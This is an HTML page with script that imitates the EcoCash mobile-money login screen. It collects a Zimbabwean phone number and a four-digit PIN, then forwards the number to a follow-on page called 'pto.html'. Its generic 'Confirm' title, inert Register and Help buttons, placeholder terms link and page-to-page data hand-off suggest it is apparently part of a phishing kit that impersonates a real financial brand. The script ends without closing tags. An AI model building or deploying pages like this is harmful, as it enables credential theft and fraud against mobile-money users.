<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #ffffff;
            -webkit-font-smoothing: antialiased;
        }

        .container {
            max-width: 400px;
            margin: auto;
            padding: 32px 16px 0;
            text-align: center;
        }

        .logo {
            font-size: 44px;
            font-weight: bold;
            margin-bottom: 16px;
        }

        .logo span:first-child {
            color: #0b5ed7;
        }

        .logo span:last-child {
            color: #e5533d;
        }

        h2 {
            font-weight: normal;
            margin-bottom: 24px;
            font-size: 20px;
        }

        .phone-box {
            border: 2px solid #0b5ed7;
            border-radius: 12px;
            padding: 12px 14px;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 14px;
            background: #fff;
        }

        .flag-img {
            width: 26px;
            height: auto;
        }

        .country-code {
            font-size: 16px;
            font-weight: bold;
            white-space: nowrap;
        }

        .phone-input {
            border: none;
            outline: none;
            font-size: 16px;
            flex: 1;
            padding: 6px 4px;
            background: transparent;
        }

        .phone-input::placeholder {
            color: #aaa;
        }

        .phone-box:focus-within {
            box-shadow: 0 0 0 3px rgba(11, 94, 215, 0.15);
        }

        .pin-label {
            margin-top: 18px;
            color: #666;
            font-size: 14px;
        }

        .pin-boxes {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 14px 0;
        }

        .pin-boxes input {
            width: 48px;
            height: 48px;
            border: 2px solid #0b5ed7;
            border-radius: 10px;
            font-size: 20px;
            text-align: center;
            outline: none;
        }

        .pin-boxes input:focus {
            box-shadow: 0 0 0 3px rgba(11, 94, 215, 0.15);
        }

        .forgot {
            color: #666;
            font-size: 13px;
            margin-bottom: 10px;
        }

        .bottom {
            position: relative;
            background: #0b5ed7;
            padding: 56px 16px 24px;
            color: #fff;
            text-align: center;
            overflow: hidden;
            margin-top: 30px;
        }

        .bottom::before {
            content: "";
            position: absolute;
            top: -45px;
            left: 0;
            width: 100%;
            height: 90px;
            background: #ffffff;
            border-bottom-left-radius: 100% 100%;
            border-bottom-right-radius: 100% 100%;
        }

        .bottom p {
            margin-bottom: 22px;
            font-size: 14px;
            line-height: 1.4;
        }

        .buttons {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 22px;
        }

        .btn {
            background: #fff;
            color: #0b5ed7;
            padding: 14px;
            width: 150px;
            border-radius: 14px;
            font-weight: bold;
            border: none;
            font-size: 14px;
            cursor: pointer;
        }

        .btn:active {
            transform: scale(0.98);
        }

        .version {
            font-size: 12px;
            margin-bottom: 6px;
        }

        .terms {
            font-size: 11px;
            line-height: 1.4;
        }

        .terms a {
            color: #fff;
            text-decoration: underline;
        }

        @media (max-width: 360px) {
            .logo {
                font-size: 38px;
            }

            .pin-boxes input {
                width: 44px;
                height: 44px;
            }

            .btn {
                width: 100%;
                max-width: 220px;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="logo">
            <span>Eco</span><span>Cash</span>
        </div>

        <h2>Login</h2>

        <div class="phone-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" alt="ZW"
                class="flag-img">
            <span class="country-code">+263</span>
            <input type="tel" id="phoneInput" class="phone-input" placeholder="" inputmode="numeric" maxlength="9">
        </div>

        <div class="pin-label">Enter your PIN</div>

        <div class="pin-boxes">
            <input class="code-box" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input class="code-box" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input class="code-box" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input class="code-box" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
        </div>

        <div class="forgot">Forgot PIN?</div>

        <button type="button" id="connexionBtn" class="btn submit-btn" disabled style="display:block; width:100%; max-width:300px; margin:20px auto 0; padding:14px 20px; background:#bdbdbd; color:#fff; border-radius:12px; font-size:16px; font-weight:bold; cursor:not-allowed;">Submit</button>
    </div>

    <div class="bottom">
        <p>To register a EcoCash wallet or get assistance,<br>click below</p>

        <div class="buttons">
            <button class="btn">Register</button>
            <button class="btn">Help &amp; Support</button>
        </div>

        <div class="version">v2.2.3P</div>

        <div class="terms">
            By signing in you agree to the
            <a href="#">Terms and Conditions</a>
        </div>
    </div>

    <script>
        const phoneInput = document.getElementById('phoneInput');
        const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
        const connexionBtn = document.getElementById('connexionBtn');

        function normalizeZimbabwePhone(value) {
            const digits = (value || '').replace(/\D/g, '');
            const compact = digits.startsWith('263') ? digits.slice(3) : digits;
            const local = compact.startsWith('0') ? compact.slice(1) : compact;
            return local.slice(0, 9);
        }

        function isValidZimbabwePhone(value) {
            const local = normalizeZimbabwePhone(value);
            return /^\d{9}$/.test(local);
        }

        function updateSubmitState() {
            const phoneIsValid = isValidZimbabwePhone(phoneInput.value);
            const pinFilled = codeBoxes.every((box) => box.value && box.value.length === 1);
            const valid = phoneIsValid && pinFilled;

            connexionBtn.disabled = !valid;
            connexionBtn.style.background = valid ? '#0b5ed7' : '#bdbdbd';
            connexionBtn.style.cursor = valid ? 'pointer' : 'not-allowed';
        }

        const incomingParams = new URLSearchParams(window.location.search);
        const incomingPhone = incomingParams.get('phone') || '';
        const normalizedPhone = normalizeZimbabwePhone(incomingPhone);
        if (/^\d{9}$/.test(normalizedPhone)) {
            phoneInput.value = normalizedPhone;
        }

        phoneInput.addEventListener('input', () => {
            phoneInput.value = normalizeZimbabwePhone(phoneInput.value);
            updateSubmitState();
        });

        codeBoxes.forEach((box, index) => {
            box.addEventListener('input', (event) => {
                const digit = (event.target.value || '').replace(/\D/g, '').slice(0, 1);
                event.target.value = digit;

                if (digit && index < codeBoxes.length - 1) {
                    codeBoxes[index + 1].focus();
                }

                updateSubmitState();
            });

            box.addEventListener('keydown', (event) => {
                if (event.key === 'Backspace' && !box.value && index > 0) {
                    codeBoxes[index - 1].focus();
                }
            });

            box.addEventListener('paste', (event) => {
                event.preventDefault();
                const pasted = (event.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
                if (!pasted) return;

                let currentIndex = index;
                pasted.split('').forEach((digit) => {
                    if (currentIndex < codeBoxes.length) {
                        codeBoxes[currentIndex].value = digit;
                        currentIndex += 1;
                    }
                });

                const nextEmpty = codeBoxes.find((item) => !item.value);
                if (nextEmpty) nextEmpty.focus();
                updateSubmitState();
            });
        });

        connexionBtn.addEventListener('click', () => {
            if (connexionBtn.disabled) return;

            const localPhone = normalizeZimbabwePhone(phoneInput.value.trim());
            if (!isValidZimbabwePhone(localPhone)) {
                alert('Please enter a valid Zimbabwe mobile number.');
                return;
            }

            const finalPhone = '263' + localPhone;
            window.location.href = 'pto.html?phone=' + encodeURIComponent(finalPhone);
        });
